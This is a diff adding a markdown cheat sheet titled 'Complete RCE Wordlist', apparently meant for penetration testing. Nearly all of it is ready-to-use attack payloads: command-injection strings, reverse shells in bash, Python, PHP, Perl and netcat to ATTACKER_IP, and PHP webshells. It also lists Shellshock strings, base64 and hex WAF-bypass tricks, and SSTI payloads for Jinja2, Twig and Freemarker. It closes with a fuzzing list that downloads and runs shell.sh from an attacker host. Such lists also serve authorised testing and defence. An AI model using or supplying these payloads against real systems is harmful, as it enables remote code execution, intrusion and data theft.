@@ -1,0 +1,252 @@
+# ⚡ COMPLETE RCE WORDLIST
+
+---
+
+# 🧩 1. **Basic Command Injection Payloads**
+```
+; id
+&& id
+| id
+`id`
+$(id)
+;whoami
+&& whoami
+| whoami
+`sleep 5`
+$(sleep 5)
+|| whoami
+| ls -la
+; uname -a
+&& uname -a
+| uname -a
+$(uname -a)
+`uname -a`
+```
+
+---
+
+# 🧩 2. **Command Separators**
+(used to chain malicious payloads)
+```
+;
+&&
+||
+|
+&
+%0a (newline)
+%0d (carriage return)
+%0a%0d (newline + carriage return)
+` (backtick)
+$() (subshell)
+%26 (encoded &)
+%3B (encoded ;)
+%7C (encoded |)
+```
+
+---
+
+# 🧩 3. **Blind Command Injection (No Output)**
+(Try to cause a **delay** and measure it)
+```
+; sleep 5
+&& sleep 5
+| sleep 5
+; ping -c 5 127.0.0.1
+&& ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+; timeout 5
+; for i in {1..5}; do sleep 1; done
+&& perl -e 'sleep(5)'
+&& python -c 'import time; time.sleep(5)'
+&& php -r 'sleep(5);'
+```
+
+---
+
+# 🧩 4. **Reverse Shell Payloads (Common)**
+✅ (Replace `ATTACKER_IP` and `PORT` before using.)
+
+**Bash Reverse Shell:**
+```
+bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+```
+
+**Python Reverse Shell:**
+```
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+**PHP Reverse Shell:**
+```
+php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+**Perl Reverse Shell:**
+```
+perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+**nc (netcat) Reverse Shell:**
+```
+nc -e /bin/sh ATTACKER_IP PORT
+```
+
+---
+
+# 🧩 5. **Webshells Payloads**
+**PHP Webshell**
+```php
+<?php system($_GET['cmd']); ?>
+```
+**Minimal PHP Webshell (Base64)** 
+```php
+<?=`$_GET[0]`?>
+```
+*(access via: `http://target/shell.php?0=id`)*
+
+---
+
+# 🧩 6. **Environment Variable Payloads**
+(Useful for injecting via headers like `User-Agent`)
+
+```
+() { :;}; /bin/bash -c "id"       # Shellshock attack
+() { :;}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+${IFS}ls${IFS}-la
+${IFS}cat${IFS}/etc/passwd
+```
+
+---
+
+# 🧩 7. **Obfuscated Payloads (Bypass WAF)**
+✅ Alternate ways to encode the same command:
+
+**Basic:**
+```
+;`whoami`
+&&$(whoami)
+;`sleep${IFS}5`
+;$(sleep${IFS}5)
+;echo${IFS}whoami
+```
+
+**Base64 Obfuscation:**
+(Encode payload in base64, then decode+execute)
+```
+echo d2hvYW1pCg== | base64 -d | bash
+```
+
+**Hex Encoding:**
+(Commands via hex representation)
+
+E.g., `id` ➔ `\x69\x64`
+```
+printf '\x69\x64'|bash
+```
+
+---
+
+# 🧩 8. **Language-Specific Payloads**
+✅ Try these if the backend runs a specific programming language.
+
+**Python:**
+```
+python -c 'import os; os.system("id")'
+python3 -c 'import os; os.system("sleep 5")'
+```
+
+**PHP:**
+```
+php -r 'system("id");'
+```
+
+**Perl:**
+```
+perl -e 'exec "id";'
+```
+
+**Ruby:**
+```
+ruby -e 'exec "id"'
+```
+
+**NodeJS:**
+```
+require('child_process').exec('id')
+```
+
+---
+
+# 🧩 9. **Template Injection Leading to RCE (SSTI)**
+If template injection is found:
+✅ Payloads:
+
+**Jinja2 (Python Flask/Django):**
+```
+{{7*7}}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+```
+
+**Twig (PHP Laravel/Symfony):**
+```
+{{['id']|filter('system')}}
+```
+
+**Freemarker (Java Spring):**
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
+```
+
+---
+
+# 🧩 10. **Useful Directory Traversal for RCE Context**
+(when trying to call binaries from weird paths)
+
+```
+/bin/bash
+/bin/sh
+/usr/bin/bash
+/usr/bin/sh
+/usr/local/bin/bash
+/usr/local/bin/sh
+```
+
+---
+
+# 🧩 11. **Final Attack Patterns (Mix Commands)**
+✅ Try chaining multiple commands to improve detection.
+
+```
+; whoami; uname -a
+&& id && whoami && hostname
+| ls -al /tmp/; cat /etc/passwd
+$(id)$(uname -a)
+; echo vulnerable > /tmp/pwned
+```
+
+---
+
+# ⚡ Pro Extra — **Special RCE Wordlist for Burp Intruder/ffuf**
+(Optimized payloads, quick copy-paste!)
+
+```
+;id
+&&id
+|id
+$(id)
+`id`
+;uname -a
+&&uname -a
+|uname -a
+`sleep 5`
+$(sleep 5)
+;nc ATTACKER_IP PORT -e /bin/sh
+;bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+;perl -e 'exec "id"'
+;python3 -c 'import os;os.system("id")'
+;php -r 'system("id");'
+;{sleep,5}
+;`ping${IFS}-c${IFS}5${IFS}127.0.0.1`
+;wget${IFS}http://ATTACKER_IP:PORT/shell.sh${IFS}-O${IFS}/tmp/shell.sh;sh${IFS}/tmp/shell.sh
+```
+
